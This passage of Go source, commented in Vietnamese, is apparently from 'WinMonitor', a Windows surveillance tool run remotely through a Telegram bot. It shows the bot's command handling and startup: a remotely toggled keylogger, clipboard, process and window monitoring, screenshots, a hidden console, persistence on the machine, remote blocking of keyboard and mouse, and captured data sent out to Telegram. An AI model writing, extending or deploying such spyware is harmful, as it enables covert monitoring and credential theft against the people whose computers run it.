				pendingMu.Unlock()
				executeAction(action)
				return
			}
		}
		otpFailures++
		exceeded := otpFailures >= 5
		if exceeded {
			pending = map[string]pendingOtp{}
			otpFailures = 0
		}
		pendingMu.Unlock()
		if exceeded {
			notify("❌ Sai mã quá 5 lần — đã hủy toàn bộ yêu cầu. Hãy tạo lại.")
		} else {
			notify(fmt.Sprintf("❌ Mã không đúng hoặc đã hết hạn (còn %d lần thử).", 5-otpFailures))
		}
	case "/cancel":
		pendingMu.Lock()
		pending = map[string]pendingOtp{}
		otpFailures = 0
		pendingMu.Unlock()
		notify("✅ Đã hủy mọi yêu cầu đang chờ.")
	case "/config":
		c := cfgGet()
		c.BotToken = maskToken(c.BotToken)
		data, _ := json.MarshalIndent(c, "", "  ")
		notify("<b>CẤU HÌNH</b>\n<code>" + htmlEscape(string(data)) + "</code>")
	case "/get":
		if len(args) == 0 {
			notify("Cú pháp: /get <khóa>")
			return
		}
		if v, ok := getConfigValue(args[0]); ok {
			notify(fmt.Sprintf("<b>%s</b> = <code>%s</code>", args[0], htmlEscape(v)))
		} else {
			notify("❌ Khóa không hợp lệ.")
		}
	case "/set":
		if len(args) < 2 {
			notify("Cú pháp: /set <khóa> <giá trị>")
			return
		}
		key := args[0]
		val := strings.Join(args[1:], " ")
		if err := applySet(key, val); err != "" {
			notify("❌ " + err)
			return
		}
		notify(fmt.Sprintf("✅ %s = %s", key, val))
	case "/reset":
		old := cfgGet()
		cfg = defaultConfig()
		cfg.BotToken = old.BotToken
		cfg.ChatID = old.ChatID
		cfgMu.Lock()
		cfg.Validate()
		cfgMu.Unlock()
		saveConfig()
		notify("✅ Đã đặt lại cấu hình về mặc định (giữ nguyên token/chat_id).")
	case "/reload_config":
		loadConfig()
		notify("✅ Đã nạp lại cấu hình từ file.")
	case "/logs":
		n := 30
		if len(args) > 0 && isDigits(args[0]) {
			n, _ = strconv.Atoi(args[0])
			if n > 200 {
				n = 200
			}
		}
		data, err := os.ReadFile(logPath)
		if err != nil {
			notify("⚠️ Không đọc được log.")
			return
		}
		lines := strings.Split(string(data), "\n")
		if len(lines) > n {
			lines = lines[len(lines)-n:]
		}
		txt := strings.Join(lines, "\n")
		if len(txt) > 3500 {
			txt = txt[len(txt)-3500:]
		}
		notify("<b>LOG (cuối)</b>\n<code>" + htmlEscape(txt) + "</code>")
	default:
		notify("❓ Lệnh không rõ. Gửi /help để xem danh sách.")
	}
}

func getConfigValue(key string) (string, bool) {
	c := cfgGet()
	switch key {
	case "bot_token":
		return maskToken(c.BotToken), true
	case "chat_id":
		return c.ChatID, true
	case "screenshot_interval":
		return strconv.Itoa(c.ScreenshotInterval), true
	case "screenshots_enabled":
		return strconv.FormatBool(c.ScreenshotsEnabled), true
	case "activity_monitor":
		return strconv.FormatBool(c.ActivityMonitor), true
	case "process_monitor":
		return strconv.FormatBool(c.ProcessMonitor), true
	case "clipboard_monitor":
		return strconv.FormatBool(c.ClipboardMonitor), true
	case "keylogger":
		return strconv.FormatBool(c.Keylogger), true
	case "keylog_flush":
		return strconv.Itoa(c.KeylogFlush), true
	case "block_safety_minutes":
		return strconv.Itoa(c.BlockSafetyMinutes), true
	case "heartbeat_interval":
		return strconv.Itoa(c.HeartbeatInterval), true
	case "allow_autobind":
		return strconv.FormatBool(c.AllowAutoBind), true
	}
	return "", false
}

func applySet(key, val string) string {
	setInt := func(apply func(c *Config, v int)) string {
		v, err := strconv.Atoi(val)
		if err != nil {
			return "Giá trị phải là số nguyên."
		}
		cfgUpdate(func(c *Config) { apply(c, v) })
		return ""
	}
	setBool := func(apply func(c *Config, b bool)) {
		b := parseBool(val)
		cfgUpdate(func(c *Config) { apply(c, b) })
	}
	switch key {
	case "screenshot_interval":
		return setInt(func(c *Config, v int) { c.ScreenshotInterval = v })
	case "screenshots_enabled":
		setBool(func(c *Config, b bool) { c.ScreenshotsEnabled = b })
	case "activity_monitor":
		setBool(func(c *Config, b bool) { c.ActivityMonitor = b })
	case "process_monitor":
		setBool(func(c *Config, b bool) { c.ProcessMonitor = b })
	case "clipboard_monitor":
		setBool(func(c *Config, b bool) { c.ClipboardMonitor = b })
	case "keylogger":
		setBool(func(c *Config, b bool) { c.Keylogger = b })
	case "keylog_flush":
		return setInt(func(c *Config, v int) { c.KeylogFlush = v })
	case "block_safety_minutes":
		return setInt(func(c *Config, v int) { c.BlockSafetyMinutes = v })
	case "heartbeat_interval":
		return setInt(func(c *Config, v int) { c.HeartbeatInterval = v })
	case "allow_autobind":
		setBool(func(c *Config, b bool) { c.AllowAutoBind = b })
	default:
		return "Khóa không hợp lệ. Khóa hợp lệ: screenshot_interval, screenshots_enabled, activity_monitor, process_monitor, clipboard_monitor, keylogger, keylog_flush, block_safety_minutes, heartbeat_interval, allow_autobind"
	}
	return ""
}

func onoff(b bool) string {
	if b {
		return "BẬT"
	}
	return "TẮT"
}

func isDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

func maskToken(t string) string {
	if len(t) > 8 {
		return t[:8] + "...(ẩn)"
	}
	return "***"
}

// ---- Update dispatch ----
func isAuthorized(chatID string) bool {
	cid := strings.TrimSpace(cfgGet().ChatID)
	if cid == "" || strings.Contains(cid, "PUT_YOUR") {
		if !cfgGet().AllowAutoBind {
			logMsg("Từ chối chat lạ (allow_autobind=false): " + chatID)
			return false
		}
		cfgUpdate(func(c *Config) { c.ChatID = chatID })
		notify("✅ Đã liên kết chat này (<code>" + chatID + "</code>) làm chủ.\nGửi /help để bắt đầu.")
		return true
	}
	return chatID == cid
}

func handleUpdate(upd map[string]interface{}) {
	// Callback từ inline keyboard (issue #38)
	if cb, ok := upd["callback_query"].(map[string]interface{}); ok {
		id, _ := cb["id"].(string)
		data, _ := cb["data"].(string)
		fromChat := ""
		if msg, ok := cb["message"].(map[string]interface{}); ok {
			if chat, ok := msg["chat"].(map[string]interface{}); ok {
				fromChat = chatIDOf(chat)
			}
		}
		tgCall("answerCallbackQuery", map[string]string{"callback_query_id": id}, "", "")
		if fromChat != "" && isAuthorized(fromChat) && strings.HasPrefix(data, "/") {
			handleCommand(data, fromChat)
		}
		return
	}
	msg, _ := upd["message"].(map[string]interface{})
	if msg == nil {
		msg, _ = upd["edited_message"].(map[string]interface{})
	}
	if msg == nil {
		return
	}
	chat, _ := msg["chat"].(map[string]interface{})
	if chat == nil {
		return
	}
	chatID := chatIDOf(chat)
	if chatID == "" {
		return
	}
	text, _ := msg["text"].(string)
	if !isAuthorized(chatID) {
		logMsg(fmt.Sprintf("Unauthorized chat: %s text=%q", chatID, text))
		return
	}
	handleCommand(text, chatID)
}

func chatIDOf(chat map[string]interface{}) string {
	switch v := chat["id"].(type) {
	case float64:
		return strconv.FormatInt(int64(v), 10)
	case json.Number:
		return v.String()
	case string:
		return v
	}
	return ""
}

// ---- Heartbeat ----
func heartbeatLoop() {
	for isRunning() {
		hb := cfgGet().HeartbeatInterval
		if hb <= 0 {
			time.Sleep(60 * time.Second)
			continue
		}
		time.Sleep(time.Duration(hb) * time.Second)
		if isRunning() {
			notify(fmt.Sprintf("💓 WinMonitor vẫn đang chạy. Uptime %d phút.", int(time.Since(startTime).Minutes())))
		}
	}
}

// ---- Polling ----
func pollLoop() {
	offset := 0
	backoff := time.Second
	for isRunning() {
		params := map[string]string{
			"offset":          strconv.Itoa(offset),
			"timeout":         "25",
			"allowed_updates": `["message","callback_query"]`,
		}
		res := tgCall("getUpdates", params, "", "")
		if ok, _ := res["ok"].(bool); !ok {
			// 409 = token dùng ở nơi khác (issue #13)
			if ec, _ := res["error_code"].(float64); int(ec) == 409 {
				logMsg("409 Conflict: bot token đang được dùng ở nơi khác (máy/tiến trình khác).")
				time.Sleep(10 * time.Second)
				continue
			}
			time.Sleep(backoff)
			if backoff < 30*time.Second {
				backoff *= 2
			}
			continue
		}
		backoff = time.Second
		result, _ := res["result"].([]interface{})
		for _, u := range result {
			upd, _ := u.(map[string]interface{})
			if upd == nil {
				continue
			}
			if idf, ok := upd["update_id"].(float64); ok {
				offset = int(idf) + 1
			}
			handleUpdate(upd)
		}
	}
}

// ---- helpers for args ----
func argValue(name string) string {
	args := os.Args[1:]
	for i, a := range args {
		if a == name && i+1 < len(args) {
			return args[i+1]
		}
		if strings.HasPrefix(a, name+"=") {
			return a[len(name)+1:]
		}
	}
	return ""
}

// scrubArgs che token trong os.Args để không lộ qua process list (issue #2).
func scrubArgs() {
	for i := 0; i < len(os.Args); i++ {
		if os.Args[i] == "--token" && i+1 < len(os.Args) {
			os.Args[i+1] = "***"
		} else if strings.HasPrefix(os.Args[i], "--token=") {
			os.Args[i] = "--token=***"
		}
	}
}

func applyCLIConfig() {
	// Token ưu tiên biến môi trường WINMON_TOKEN (kín hơn --token)
	if tok := os.Getenv("WINMON_TOKEN"); tok != "" {
		cfgUpdate(func(c *Config) { c.BotToken = tok })
	}
	if cfgFile := argValue("--config"); cfgFile != "" && fileExists(cfgFile) {
		if data, err := os.ReadFile(cfgFile); err == nil {
			if c, ok := applyConfigData(cfgGet(), data); ok {
				cfgMu.Lock()
				cfg = c
				cfgMu.Unlock()
				saveConfig()
			}
		}
	}
	if tok := argValue("--token"); tok != "" {
		cfgUpdate(func(c *Config) { c.BotToken = tok })
	}
	if chat := argValue("--chat"); chat != "" {
		cfgUpdate(func(c *Config) { c.ChatID = chat })
	}
	scrubArgs()
}

func main() {
	os.MkdirAll(baseDir, 0o755)
	setDpiAwareness()
	hideConsole()
	loadConfig()
	applyCLIConfig()

	token := cfgGet().BotToken
	if token == "" || strings.Contains(token, "PUT_YOUR") {
		logMsg("Chưa cấu hình bot_token. Dừng.")
		return
	}
	if !acquireSingleInstance() {
		logMsg("Đã có 1 bản WinMonitor đang chạy. Thoát.")
		return
	}

	// Kiểm tra token hợp lệ (issue #9) — chỉ thoát nếu token SAI, không thoát khi offline
	if me := tgCall("getMe", map[string]string{}, "", ""); func() bool {
		if ok, _ := me["ok"].(bool); ok {
			return false
		}
		if ec, _ := me["error_code"].(float64); int(ec) == 401 {
			return true // token sai
		}
		return false // lỗi mạng -> tiếp tục
	}() {
		logMsg("bot_token không hợp lệ (401). Dừng.")
		return
	} else if ok, _ := me["ok"].(bool); !ok {
		logMsg("Cảnh báo: không kết nối được Telegram lúc khởi động (sẽ thử lại).")
	}

	AutoUnblockNotify = func() { notify("🔓 Đã tự KẾT NỐI LẠI bàn phím & chuột (hết thời hạn an toàn).") }

	hookOK = startKeyboardHook(keySink)

	ensurePersistence()
	cleanupOldShots(2 * time.Hour)

	go senderLoop()
	go registerBotCommands()
	go screenshotLoop()
	go windowMonitor()
	go processMonitor()
	go clipboardMonitor()
	go keyloggerLoop()
	go heartbeatLoop()
	go selfhealLoop()

	logMsg("WinMonitor started.")
	notify("✅ <b>WinMonitor đã khởi động</b> trên máy này.\nGửi /help để xem lệnh.")

	go pollLoop()

	// Chờ tín hiệu thoát (issue #29): giải phóng BlockInput rồi thoát êm
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	select {
	case <-stopMain:
	case <-sig:
	}
	StopBlock()
	time.Sleep(300 * time.Millisecond)
	os.Exit(0)
}
